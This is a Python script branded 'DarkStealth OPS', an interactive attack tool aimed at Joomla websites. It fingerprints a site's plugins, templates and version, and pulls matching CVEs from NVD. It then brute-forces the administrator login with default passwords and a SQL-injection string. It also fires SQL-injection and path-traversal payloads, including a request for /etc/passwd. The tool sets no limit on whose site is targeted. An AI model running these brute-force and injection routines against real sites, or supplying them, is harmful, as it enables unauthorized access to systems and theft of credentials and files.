#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import time
import json
from urllib.parse import urljoin

NVD_API_KEY = ""

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile)"
}

def banner():
    print("\033[1;32m")
    print("=" * 60)
    print(" DarkStealth OPS - Joomla Advanced Scanner")
    print(" Developed by @maxxmaisan")
    print("=" * 60)
    print("\033[0m")

def input_url():
    url = input("[*] Enter your target Joomla site URL (e.g. https://example.com): ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    if url.endswith("/"):
        url = url[:-1]
    return url

def detect_plugins(url):
    print("[+] Detecting Joomla plugins...")
    common_plugins = ["com_users", "com_contact", "com_content", "com_weblinks", "com_search", "com_banners"]
    found = []

    for plugin in common_plugins:
        full_url = f"{url}/index.php?option={plugin}"
        response = requests.get(full_url, headers=headers)

        if response.status_code == 200 and plugin in response.text:
            print(f" [✔] Found plugin: {plugin}")
            found.append(plugin)

    if not found:
        print(" [-] No common plugins detected.")

    return found

def detect_templates(url):
    print("[+] Detecting Joomla templates/themes...")

    try:
        response = requests.get(url, headers=headers)
        matches = re.findall(r'/templates/([a-zA-Z0-9_-]+)/', response.text)

        if matches:
            for template in set(matches):
                print(f" [✔] Detected Template: {template}")
        else:
            print(" [-] No templates detected.")

    except Exception as error:
        print(f" [!] Error: {error}")

def detect_version(url):
    print("[+] Detecting Joomla version...")

    response = requests.get(url + "/language/en-GB/en-GB.xml", headers=headers)

    if response.status_code == 200:
        version_match = re.findall(r'<version>(.*?)</version>', response.text)

        if version_match:
            print(f" [✔] Joomla Version Detected: {version_match[0]}")
            return version_match[0]

    print(" [-] Joomla version not detected.")
    return None

def lookup_cve(version):
    if not version:
        print(" [!] Version not provided for CVE lookup.")
        return

    print(f"[+] Looking up CVEs for Joomla {version}...")

    try:
        base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        params = {"keywordSearch": f"Joomla {version}"}

        if NVD_API_KEY:
            headers["apiKey"] = NVD_API_KEY

        response = requests.get(base_url, headers=headers, params=params)
        data = response.json()
        vulnerabilities = data.get("vulnerabilities", [])

        if not vulnerabilities:
            print(" [-] No known CVEs found.")

        for cve in vulnerabilities[:5]:
            cve_id = cve['cve']['id']
            description = cve['cve']['descriptions'][0]['value']
            print(f" [!] {cve_id}: {description}")

    except Exception as error:
        print(f" [!] Error fetching CVEs: {error}")

def brute_force_admin(url):
    print("[+] Starting admin panel brute force...")

    login_url = urljoin(url, "administrator/index.php")
    usernames = ["admin", "administrator", "root"]
    passwords = ["admin", "admin123", "123456", "' OR '1'='1", "password"]

    for username in usernames:
        for password in passwords:
            data = {"username": username, "passwd": password, "task": "login", "option": "com_login"}
            response = requests.post(login_url, headers=headers, data=data, allow_redirects=True)

            if "logout" in response.text.lower() or "control panel" in response.text.lower():
                print(f" [✔] Login found: {username} / {password}")
                return

            print(f" [-] Tried: {username} / {password}")

    print(" [!] No working credentials found.")

def scan_sqli_lfi(url):
    print("[+] Scanning for SQLi and LFI vulnerabilities...")

    test_paths = [
        "index.php?option=com_content&id=1",
        "index.php?option=com_users&id=1",
        "index.php?option=com_search&searchword=test"
    ]

    payloads = ["'", "\"", "' OR '1'='1", "../../../../etc/passwd"]

    for path in test_paths:
        for payload in payloads:
            full_url = url + "/" + path + payload
            response = requests.get(full_url, headers=headers)

            if "sql" in response.text.lower() or "syntax" in response.text.lower() or "root:x" in response.text:
                print(f" [!] Possible vulnerability at: {full_url}")
            else:
                print(f" [-] Tested: {full_url}")

def full_scan(url):
    detect_plugins(url)
    detect_templates(url)
    version = detect_version(url)
    lookup_cve(version)
    brute_force_admin(url)
    scan_sqli_lfi(url)

def menu():
    banner()
    target = input_url()

    while True:
        print("")
        print(" [1] Detect Plugins")
        print(" [2] Detect Templates")
        print(" [3] Joomla Version & CVE Lookup")
        print(" [4] Admin Panel Brute Forcer")
        print(" [5] SQLi / LFI Scanner")
        print(" [6] Full Scan (All Modules)")
        print(" [0] Exit")
        choice = input("\n Select an option: ")

        if choice == '1':
            detect_plugins(target)
        elif choice == '2':
            detect_templates(target)
        elif choice == '3':
            version = detect_version(target)
            lookup_cve(version)
        elif choice == '4':
            brute_force_admin(target)
        elif choice == '5':
            scan_sqli_lfi(target)
        elif choice == '6':
            full_scan(target)
        elif choice == '0':
            print("\n Exiting... DarkStealth OPS by @maxxmaisan")
            break
        else:
            print(" Invalid selection. Try again.")

if __name__ == "__main__":
    menu()
